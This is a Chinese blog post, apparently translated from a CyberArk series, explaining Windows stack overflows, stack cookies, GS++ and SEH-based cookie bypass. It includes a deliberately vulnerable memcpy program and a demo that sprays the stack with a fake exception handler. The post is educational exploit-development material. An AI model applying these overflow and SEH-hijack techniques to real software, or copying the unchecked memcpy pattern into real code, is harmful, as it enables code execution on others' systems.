<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>栈溢出 | qianmu's blog</title><meta name="author" content="qianmu"><meta name="copyright" content="qianmu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Windows栈溢出原文链接：Windows 内存损坏漏洞的现代探索 – 第一部分：栈溢出 (cyberark.com) 代码地址：https:&#x2F;&#x2F;github.com&#x2F;forrest-orr&#x2F;ExploitDev  前排提示：由于翻译的差异，“栈”与“堆栈”指的实际上是同一个东西，说的都是“stack”，然而，面向大多数刚刚接触编程的同学们，对于“堆”（heap）和“栈”的理解区分至关重要。因此">
<meta property="og:type" content="article">
<meta property="og:title" content="栈溢出">
<meta property="og:url" content="https://qianmuoy.github.io/2024/02/04/%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
<meta property="og:site_name" content="qianmu&#39;s blog">
<meta property="og:description" content="Windows栈溢出原文链接：Windows 内存损坏漏洞的现代探索 – 第一部分：栈溢出 (cyberark.com) 代码地址：https:&#x2F;&#x2F;github.com&#x2F;forrest-orr&#x2F;ExploitDev  前排提示：由于翻译的差异，“栈”与“堆栈”指的实际上是同一个东西，说的都是“stack”，然而，面向大多数刚刚接触编程的同学们，对于“堆”（heap）和“栈”的理解区分至关重要。因此">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
<meta property="article:published_time" content="2024-02-04T12:38:23.000Z">
<meta property="article:modified_time" content="2024-02-04T12:40:50.892Z">
<meta property="article:author" content="qianmu">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://qianmuoy.github.io/2024/02/04/%E6%A0%88%E6%BA%A2%E5%87%BA/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '栈溢出',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-02-04 20:40:50'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="qianmu's blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">12</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="qianmu's blog"><span class="site-name">qianmu's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">栈溢出</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-02-04T12:38:23.000Z" title="Created 2024-02-04 20:38:23">2024-02-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-02-04T12:40:50.892Z" title="Updated 2024-02-04 20:40:50">2024-02-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="栈溢出"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Windows栈溢出"><a href="#Windows栈溢出" class="headerlink" title="Windows栈溢出"></a>Windows栈溢出</h1><p>原文链接：<a target="_blank" rel="noopener" href="https://www.cyberark.com/resources/threat-research-blog/a-modern-exploration-of-windows-memory-corruption-exploits-part-i-stack-overflows">Windows 内存损坏漏洞的现代探索 – 第一部分：栈溢出 (cyberark.com)</a></p>
<p>代码地址：<a target="_blank" rel="noopener" href="https://github.com/forrest-orr/ExploitDev">https://github.com/forrest-orr/ExploitDev</a></p>
<hr>
<p>前排提示：由于翻译的差异，“栈”与“堆栈”指的实际上是同一个东西，说的都是“stack”，然而，面向大多数刚刚接触编程的同学们，对于“堆”（heap）和“栈”的理解区分至关重要。因此，下文中应为“stack”的地方，统一称作“栈”，但难免有遗漏之处，请读者分清栈或堆栈与堆的区别，并海涵出现的疏忽。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>通过在现代操作系统上使用现代编译器记录自己的一些实验和研究来帮助解决过时的面向初学者的漏洞利用信息的问题。重点是Windows 10和Visual Studio 2019。</p>
<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在寄存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。</p>
<p>shellcode可以按照攻击者执行的位置分为本地shellcode和远程shellcode。</p>
<h4 id="本地shellcode"><a href="#本地shellcode" class="headerlink" title="本地shellcode"></a>本地shellcode</h4><p>本地运行的shellcode经常用于利用软件漏洞提升权限。比如在Linux下由普通权限提升至root权限。</p>
<h4 id="远程shellcode"><a href="#远程shellcode" class="headerlink" title="远程shellcode"></a>远程shellcode</h4><p>利用软件漏洞获得特定的shellcode，再经由C或Python编写远程攻击程序，进而取得对方电脑的root权限。</p>
<h2 id="经典栈溢出"><a href="#经典栈溢出" class="headerlink" title="经典栈溢出"></a>经典栈溢出</h2><p>经典栈溢出是最容易理解的内存损坏漏洞。易受攻击的应用程序包含一个函数，该函数将用户控制的数据写入栈而不验证其长度。这允许攻击者：</p>
<ol>
<li>将shellcode写入栈。</li>
<li>覆盖当前函数的返回地址以指向shellcode。</li>
</ol>
<p>如果栈可以在不破坏应用程序的情况下以这种方式损坏，则shellcode将在被利用的函数返回时执行。此概念的示例如下：</p>
<p>(经过测试，运行这段代码需要在VS中关闭编译设置中的“缓冲区安全检查（GS）”选项)</p>
<p><img src="/.io//image-20230529140641266-1707050428582.png" alt="image-20230529140641266"></p>
<p>（我用的vs2022，就算关闭了这个选项它依然进行了缓冲区溢出检查，老版本也许能成功，成功运行后回报的错误应该是“无效的运行地址”，而不是栈溢出。）</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> OverflowData[] =&#123;</span><br><span class="line"><span class="string">&quot;AAAAAAAAAAAAAAAA&quot;</span> <span class="comment">// 16个字节填充缓冲区</span></span><br><span class="line"><span class="string">&quot;BBBB&quot;</span>         <span class="comment">// +4 字节 覆盖安全cookie</span></span><br><span class="line"><span class="string">&quot;CCCC&quot;</span>         <span class="comment">// +4 字节 覆盖Ebp</span></span><br><span class="line"><span class="string">&quot;DDDD&quot;</span>&#125;;        <span class="comment">// +4 字节 覆盖返回地址</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Overflow</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> Buf[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(Buf, pInputBuf, dwInputBufSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int32_t</span> <span class="title">wmain</span><span class="params">(<span class="type">int32_t</span> nArgc, <span class="type">const</span> <span class="type">wchar_t</span>* pArgv[])</span> </span>&#123;</span><br><span class="line">    _tprintf(_T(<span class="string">&quot;... passing %d bytes of data to vulnerable function\r\n&quot;</span>), <span class="built_in">sizeof</span>(OverflowData) - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">Overflow</span>(OverflowData, <span class="built_in">sizeof</span>(OverflowData) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，安全cookie是一个在我们使用的栈下方加入的一个结构：</p>
<p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/20160419224637920" alt="这里写图片描述"></p>
<p>程序对cookie的值进行监测，一旦cookie中的值发生变化，则认为程序已经造成了栈溢出，立即退出程序并回报错误。如果在上一步中没有关闭，就会造成这样的结果：</p>
<p><img src="/.io//image-20230529140319202-1707050428583.png" alt="image-20230529140319202"></p>
<p><img src="/.io//image-20230529140802964-1707050428583.png" alt="image-20230529140802964"></p>
<p>栈溢出是一种技术（与字符串格式错误和堆溢出不同）仍然可以<strong>在现代Windows应用程序中利用</strong>，使用与几十年前发布的<a target="_blank" rel="noopener" href="https://www.eecs.umich.edu/courses/eecs588/static/stack_smashing.pdf">Smashing the Stack for Fun and Profit</a>相同的方法。但是，现在适用于此类攻击的缓解措施已经非常强大了。</p>
<p>与字符串格式错误和堆溢出漏洞不同，对于栈溢出来说，攻击者仍然可以使用几十年前“Smashing the Stack for Fun and Profit”一文中提出的方法，来利用现代Windows应用程序中的这种漏洞。然而，现在针对这种攻击的缓解措施已经变得非常强大了。</p>
<p>在Windows 10上，默认情况下，使用Visual Studio 2019编译的应用程序将继承一组针对栈溢出漏洞的安全缓解措施，其中包括：</p>
<ol>
<li>SafeCRT</li>
<li>栈Cookie与安全的变量排序</li>
<li>安全的结构化异常处理（SafeSEH）</li>
<li>数据执行保护（DEP）</li>
<li>地址空间布局随机化（ASLR）</li>
<li>结构化异常处理覆盖保护（SEHOP）</li>
</ol>
<p>就算让易受攻击的CRT API（如strcpy）“退休”并通过SafeCRT库引入这些API的安全版本（如strcpy_s），也无法全面解决栈溢出的问题。这是因为像memcpy这样的API仍然有效，并且这些CRT API的非POSIX变体也是如此（例如KERNEL32.DLL!lstrcpyA）。当我们试图在Visual Studio 2019中编译包含这些“被退休”的API的应用程序时，会触发严重的编译错误，尽管这些错误是可抑制的。</p>
<p>栈Cookie是试图“修复”和防止栈溢出漏洞在运行时被利用的第一道防护机制。SafeSEH和SEHOP是在栈Cookie外围工作的两种缓解措复施，而DEP和ASLR并不是针对栈的缓解方法，因为它们并不能防止栈溢出攻击或EIP劫持的发生。相反，它们的作用提高通过这种攻击执行shellcode的难度。所有这些缓解措施都将随着本文的推进而深入探讨。下一节将重点讨论栈Cookie——目前我们在尝试利用栈溢出时的主要对手。</p>
<h2 id="栈Cookie、GS与GS"><a href="#栈Cookie、GS与GS" class="headerlink" title="栈Cookie、GS与GS++"></a>栈Cookie、GS与GS++</h2><p>随着Visual Studio 2003的发布，微软在其MSVC编译器中加入了一个新的栈溢出防御功能，称为GS。两年后，他们在发布Visual Studio 2005时默认启用了该功能。</p>
<p>关于GS，网上的信息虽然非常丰富，但是大部分都是过时的和&#x2F;或不完整的信息。之所以出现这种情况，是因为GS的安全缓解措施自最初发布以来已经发生了重大的变化：在Visual Studio 2010中，一个名为GS++的增强版GS取代了原来的GS功能。令人困惑的是，微软从未更新其编译器选项的名称，尽管实际上是GS++，但至今仍是“&#x2F;GS”。</p>
<p>从根本上说，GS其实是一种安全缓解措施，它被编译进二进制级别的程序，在包含Microsoft所谓的“GS缓冲区”（易受栈溢出攻击的缓冲区）的函数中放置策略性栈损坏检查（借助于栈Cookie）。最初的GS只考虑包含8个或更多元素，元素大小为1或2（字符和宽字符）字节的数组作为GS缓冲区，而GS++对此定义进行了实质性扩展，包括：</p>
<ol>
<li>任何数组(无论长度或元素大小)</li>
<li>结构体(无论其内容是什么)</li>
</ol>
<p><img src="/.io//Picture4-1707050428583.png" alt="img"></p>
<p>这个增强技术对现代栈溢出漏洞有很大的意义，因为它基本上使所有容易受到栈溢出攻击的函数免于受到基于返回地址的EIP劫持技术的影响。这反过来又会对其他陈旧的利用技术产生影响，比如通过部分EIP覆盖来绕过ASLR的技术——2007年著名的Vista CVE-2007-0038 Animated Cursor漏洞就利用结构溢出而流行起来的。随着2010年GS++的出现，在典型的栈溢出情况下，部分EIP覆盖作为ASLR绕过的方法已经失效。</p>
<p>MSDN上关于GS的信息（最后一次更新是在四年前的2016年），在GS覆盖率方面，与我自己的一些测试结果是相矛盾的。例如，微软将以下变量列为非GS缓冲区的例子：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *pBuf[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *pv[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> buf[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> &#123; <span class="type">int</span> a; <span class="type">int</span> b; &#125;;</span><br></pre></td></tr></table></figure>

<p>然而在我自己使用VS2019进行的测试中，这些变量都会导致栈Cookie的产生。这说明GS确实被升级为了GS++，且作用域为上述的任何数组(无论长度或元素大小)、结构体(无论其内容是什么)。</p>
<p>究竟什么是栈Cookie，它们是如何工作的？</p>
<ol>
<li>栈Cookie在Visual Studio 2019中是默认设置的。它们可以使用&#x2F;GS标志进行配置，我们可以在项目设置的 Project -&gt; Properties -&gt; C&#x2F;C++ -&gt; Code Generation -&gt; Security Check字段中设置该标志。</li>
<li>当加载了一个用&#x2F;GS编译的PE时，它会初始化一个新的随机栈Cookie种子值，并将其作为一个全局变量存储在其.data段中。</li>
<li>每当一个包含GS缓冲区的函数被调用时，它都会将这个栈Cookie种子与EBP寄存器进行XOR运算，并将其存储在保存的EBP寄存器和返回地址之前的栈上。</li>
<li>在受保护的函数返回之前，它会再次用&gt;EBP对其保存的伪唯一性栈Cookie进行XOR运算，以获得原始的栈Cookie种子值，并进行相应的检查，以确保它仍然与存储在.data段的种子相匹配。</li>
<li>如果这个值不匹配，应用程序会抛出一个安全异常并终止执行。</li>
</ol>
<p>由于攻击者不可能在覆盖返回地址的同时不覆盖函数栈帧中保存的栈Cookie，这种机制能够阻止栈溢出漏洞利用代码通过RET指令劫持EIP，从而达到任意执行代码的目的。</p>
<p>在现代编译环境中编译并执行之前的栈溢出项目，会出现STATUS_STACK_BUFFER_OVERRUN异常(代码0xC0000409)；使用调试器可以逐步剖析其出错原因。</p>
<p><img src="/.io//image-20230529145619171-1707050428583.png" alt="image-20230529145619171"></p>
<p>我们可以看到，一顿开栈操作后，创建了一个位于0x057a028的安全栈cookie，并将这个地址<strong>里面的内容</strong>压入栈。这个内容正好占用的是四个字节。</p>
<p><img src="/.io//image-20230529150116415-1707050428583.png" alt="image-20230529150116415"></p>
<p>在memcpy函数返回之后，我们可以看到栈确实被我们的预期数据破坏了，其中包括返回地址EDX，现在已经变为0x44444444。在过去，当这个函数返回时，会出现访问冲突异常，并断言0x44444444是一个要执行的无效地址。但是，栈Cookie安全检查将阻止这种情况。</p>
<p><img src="/.io//image-20230529152344262-1707050428583.png" alt="image-20230529152344262"></p>
<p>首次执行该函数时，如果将存储在.data段中的栈Cookie种子与EBP进行XOR运算，然后将其保存到栈中。由于这个值在溢出期间将被值0x42424242所覆盖（如果我们希望能够覆盖返回地址并劫持EIP，这是不可避免的），从而生成有毒的栈Cookie值，即0xa33d2a88（在ECX中可以清楚看到），现在，该值将被传递给内部函数__security_check_Cookie进行验证。</p>
<p><img src="/.io//image-20230529153040701-1707050428583.png" alt="image-20230529153040701"></p>
<p>一旦这个函数被调用，就会导致STATUS_STACK_BUFFER_OVERRUN异常（代码0xC0000409）。这虽然会导致进程崩溃，但也防止了攻击者成功利用该漏洞。</p>
<p>当您熟悉这些概念和实际例子后，会注意到关于栈Cookie的几个“有趣”的事情：</p>
<ol>
<li>它们不能防止栈溢出的发生。攻击者仍然可以随心所欲地在栈上覆盖任意数量的数据。</li>
<li>它们只是针对每个函数的伪随机值。这意味着，如果.data中的栈Cookie种子发生内存泄漏，同时栈指针也发生泄漏，攻击者就可以准确地预测Cookie，并将其嵌入到其溢出中以绕过安全异常。</li>
</ol>
<p>从根本上来说（假设它们无法通过内存泄漏进行预测），栈Cookie只能防止我们通过易受攻击的函数的返回地址来劫持EIP。这意味着我们仍然可以以任何方式破坏栈，并能够在安全检查和RET指令之前执行任意代码。那么，这在现代栈溢出的可靠利用过程中有什么价值呢？</p>
<h2 id="SSH劫持"><a href="#SSH劫持" class="headerlink" title="SSH劫持"></a>SSH劫持</h2><p>进程中的每个线程都可以注册handler函数（默认情况下也是如此），以便在触发异常时进行调用。这些handler函数的指针通常存储在栈上的EXCEPTION_REGISTRATION_RECORD结构体中。在任何版本的Windows上启动一个32位应用程序时，都至少会注册一个这样的handler，并将相关数据存储在栈中，具体如下图所示：</p>
<p>(VS找不到，IDA也没有这个关键字，只能用别人的图了)</p>
<p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/v2-9fda65d79a3df60bdc1df9b7d99346f8_1440w.webp" alt="img"></p>
<p>上面高亮显示的EXCEPTION_REGISTRATION_RECORD结构体包含一个指向下一个SEH记录的指针（也存储在栈上），后面是指向handler函数的指针（在本例中是NTDLL.DLL库中的函数）。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> &#123;</span><br><span class="line"></span><br><span class="line">PEXCEPTION_REGISTRATION_RECORD Next;</span><br><span class="line"></span><br><span class="line">PEXCEPTION_DISPOSITION Handler;</span><br><span class="line"></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure>

<p>在内部，指向SEH handler列表的指针都存储在每个线程的TEB的偏移量0处，并且每个EXCEPTION_REGISTION_RECORD都链接到下一个。如果handler不能正确处理抛出的异常，它会将执行权移交给下一个handler，以此类推。</p>
<p><img src="/.io//Picture11-1707050428583.png" alt="img"></p>
<p>因此，SEH实际上为攻击者提供了绕过栈Cookie的理想方法。我们可以利用栈溢出，覆盖现有的SHE handler(肯定至少会有一个)，然后让应用程序崩溃(考虑到我们有能力破坏栈内存，这肯定不在话下)。这将导致在易受攻击函数最后调用__SECURITY_CHECK_COOKIE之前，EIP被重定向到EXCEPTION_REGISTION_RECORD结构体中被覆盖后的handler地址。因此，在执行shellcode之前，应用程序根本没有机会发现其栈已被破坏。因此，我们可以用自定义的SEH handler喷射栈，覆盖现有的EXCEPTION_REGISTRATION_RECORD结构体。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Overflow</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> Buf[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(Buf, pInputBuf, dwInputBufSize);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">EXCEPTION_DISPOSITION __cdecl <span class="title">FakeHandler</span><span class="params">(EXCEPTION_RECORD* pExceptionRecord, <span class="type">void</span>* pEstablisherFrame, CONTEXT* pContextRecord, <span class="type">void</span>* pDispatcherContext)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	_tprintf(_T(<span class="string">&quot;... fake exception handler executed at 0x%p\r\n&quot;</span>), FakeHandler);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ExceptionContinueExecution;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int32_t</span> <span class="title">wmain</span><span class="params">(<span class="type">int32_t</span> nArgc, <span class="type">const</span> <span class="type">wchar_t</span>* pArgv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> dwOverflowSize = <span class="number">0x20000</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* pOverflowBuf = (<span class="type">uint8_t</span>*)<span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), <span class="number">0</span>, dwOverflowSize);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	_tprintf(_T(<span class="string">&quot;... spraying %d copies of fake exception handler at 0x%p to the stack...\r\n&quot;</span>), dwOverflowSize / <span class="number">4</span>, FakeHandler);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">uint32_t</span> dwOffset = <span class="number">0</span>; dwOffset &lt; dwOverflowSize; dwOffset += <span class="number">4</span>) &#123;</span><br><span class="line"></span><br><span class="line">		*(<span class="type">uint32_t</span>*)&amp;pOverflowBuf[dwOffset] = *(<span class="type">uint32_t</span>*)FakeHandler;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	_tprintf(_T(<span class="string">&quot;... passing %d bytes of data to vulnerable function\r\n&quot;</span>), dwOverflowSize);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Overflow</span>(pOverflowBuf, dwOverflowSize);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/.io//v2-cb24919b0ed83d7d0ad9fef761c7f0e7_1440w-1707050428583.webp" alt="img"></p>
